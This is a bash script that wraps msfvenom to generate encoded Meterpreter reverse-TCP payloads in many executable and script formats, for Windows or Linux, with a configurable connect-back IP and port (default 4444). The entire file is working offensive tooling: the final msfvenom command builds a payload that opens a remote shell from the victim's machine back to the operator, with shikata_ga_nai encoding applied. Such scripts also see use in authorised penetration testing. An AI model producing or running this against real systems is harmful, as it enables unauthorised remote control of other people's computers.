#!/usr/bin/env bash

### Helpers begin
check_deps() {
    local missing
    for d in "${deps[@]}"; do
        if [[ -z $(command -v "$d") ]]; then
            # Force absolute path
            if [[ ! -e "/$d" ]]; then
                err "$d was not found"
                missing="true"
            fi
        fi
    done; unset d
    [[ -z $missing ]] || exit 128
}
err() { echo -e "${color:+\e[31m}[!] $*\e[0m"; }
errx() { err "${*:2}"; exit "$1"; }
good() { echo -e "${color:+\e[32m}[+] $*\e[0m"; }
info() { echo -e "${color:+\e[37m}[*] $*\e[0m"; }
long_opt() {
    local arg shift="0"
    case "$1" in
        "--"*"="*) arg="${1#*=}"; [[ -n $arg ]] || return 127 ;;
        *) shift="1"; shift; [[ $# -gt 0 ]] || return 127; arg="$1" ;;
    esac
    echo "$arg"
    return $shift
}
subinfo() { echo -e "${color:+\e[36m}[=] $*\e[0m"; }
warn() { echo -e "${color:+\e[33m}[-] $*\e[0m"; }
### Helpers end

default_ip() {
    ip -o a | \
    grep -Psv "\s(docker\d+|lo)\s" | grep -ioPs "inet\s+\K[^\/]+"
}

usage() {
    cat <<EOF
Usage: ${0##*/} [OPTIONS] <format> [payload options]

DESCRIPTION
    Simplify generating a meterpreter payload.

OPTIONS
    -h, --help         Display this help message
    -i, --ip=IP        Connect back to specified IP address (default:
                       $ip)
    -l, --linux        Create linux meterpreter
    --no-color         Disable colorized output
    -p, --port=PORT    Connect back to the specified port (default:
                       $port)
    -w, --windows      Create windows meterpreter (default behavior)

EXECUTABLE FORMATS
    asp, aspx, aspx-exe, dll, elf, elf-so, exe, exe-only, exe-service,
    exe-small, hta-psh, loop-vbs, macho, msi, msi-nouac, osx-app, psh,
    psh-net, psh-reflection, psh-cmd, vba, vba-exe, vba-psh, vbs, war

TRANSFORM FORMATS
    bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl,
    pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication,
    vbscript

EOF
    exit "$1"
}

declare -a args
unset help
color="true"
ip="$(default_ip)"
os="windows"
port=4444

# Parse command line options
while [[ $# -gt 0 ]]; do
    case "$1" in
        "--") shift; args+=("$@"); break ;;
        "-h"|"--help") help="true" ;;
        "-i"|"--ip"*) ip="$(long_opt "$@")" ;;
        "-l"|"--linux") os="linux/x86" ;;
        "--no-color") unset color ;;
        "-p"|"--port"*) port="$(long_opt "$@")" ;;
        "-w"|"--windows") os="windows" ;;
        *) args+=("$1") ;;
    esac
    case "$?" in
        0) ;;
        1) shift ;;
        *) usage $? ;;
    esac
    shift
done
[[ ${#args[@]} -eq 0 ]] || set -- "${args[@]}"

# Help info
[[ -z $help ]] || usage 0

# Check for missing dependencies
declare -a deps
deps+=("grep")
deps+=("msfvenom")
check_deps

# Check for valid params
[[ $# -eq 1 ]] || usage 1

msfvenom -b "\x00" -e x86/shikata_ga_nai -f "$1" \
    -p "$os/meterpreter/reverse_tcp" LHOST="$ip" LPORT="$port" \
    "${@:2}" >"meterpreter.$1"
